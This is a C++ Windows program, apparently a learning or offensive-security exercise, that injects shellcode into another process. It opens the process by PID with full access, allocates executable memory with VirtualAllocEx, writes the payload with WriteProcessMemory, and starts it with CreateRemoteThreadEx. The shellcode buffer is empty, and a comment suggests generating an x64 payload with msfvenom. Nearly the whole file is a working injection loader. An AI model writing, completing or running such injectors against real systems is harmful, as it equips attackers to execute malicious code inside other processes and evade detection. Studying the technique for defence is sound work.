#include <iostream>
#include <windows.h>

/*
  BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
 */

 /*
   https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
   HANDLE OpenProcess(
   [in] DWORD dwDesiredAccess,
   [in] BOOL  bInheritHandle,
   [in] DWORD dwProcessId
 );
  */

  /*
	https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants
	LPVOID VirtualAllocEx(
	[in]           HANDLE hProcess,
	[in, optional] LPVOID lpAddress,
	[in]           SIZE_T dwSize,
	[in]           DWORD  flAllocationType,
	[in]           DWORD  flProtect
  );
  */

  /*
	https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
	BOOL WriteProcessMemory(
	[in]  HANDLE  hProcess,
	[in]  LPVOID  lpBaseAddress,
	[in]  LPCVOID lpBuffer,
	[in]  SIZE_T  nSize,
	[out] SIZE_T  *lpNumberOfBytesWritten
  );
  */

  /*
	https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex
	HANDLE CreateRemoteThreadEx(
	[in]            HANDLE                       hProcess,
	[in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
	[in]            SIZE_T                       dwStackSize,
	[in]            LPTHREAD_START_ROUTINE       lpStartAddress,
	[in, optional]  LPVOID                       lpParameter,
	[in]            DWORD                        dwCreationFlags,
	[in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
	[out, optional] LPDWORD                      lpThreadId
  );
   */

const char* s = "[+]";
const char* e = "[-]";

STARTUPINFOW si;
PROCESS_INFORMATION pi;
DWORD pid, tid = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

// you can generate a payload for x64 using msfvenom
unsigned char shellCode[] = "";


int SpawnProc()
{
	if (!CreateProcessW(
		L"C:\\Windows\\System32\\notepad.exe", // lpApplicationName
		NULL,
		NULL,
		NULL,
		FALSE,
		BELOW_NORMAL_PRIORITY_CLASS,
		NULL,
		NULL,
		&si,
		&pi
	))
	{
		printf("%s CreateProcessW() failed (%d)\n", e, GetLastError());
		return EXIT_FAILURE;
	}
	pid = pi.dwProcessId;
	printf("%s Process created with the PID (%ld)\n", s, pid);
	return pid;
}

int hookProc(DWORD pid)
{
	printf("%s Trying to open a handle to the process with the PID (%ld)\n", s, pid);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		printf("%s OpenProcess() failed (%d)\n", e, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Handle (0x%p) to the process with the PID (%ld) opened\n", s, hProcess, pid);
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s Allocated %zu-bytes\n", s, sizeof(shellCode));

	if (WriteProcessMemory(hProcess, rBuffer, shellCode, sizeof(shellCode), NULL) == 0)
	{
		printf("%s Error: %d\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s Wrote %zu-bytes to the process with pid %ld\n", s, sizeof(shellCode), pid);


	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &tid);

	if (hThread == NULL)
	{
		printf("%s Error creating remote thread: %d\n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s Got a handle to the thread with tid %ld\n", s, tid);
	//comment out to keep the proc running (still closes the window)
	WaitForSingleObject(hThread, INFINITE);
	printf("%s Thread with tid %ld finished\n", s, tid);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return EXIT_SUCCESS;
}

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		printf("%s Usage: %s <PID>\n", e, argv[0]);
		return EXIT_FAILURE;
	}
	pid = atoi(argv[1]);
	hookProc(pid);

	return EXIT_SUCCESS;
}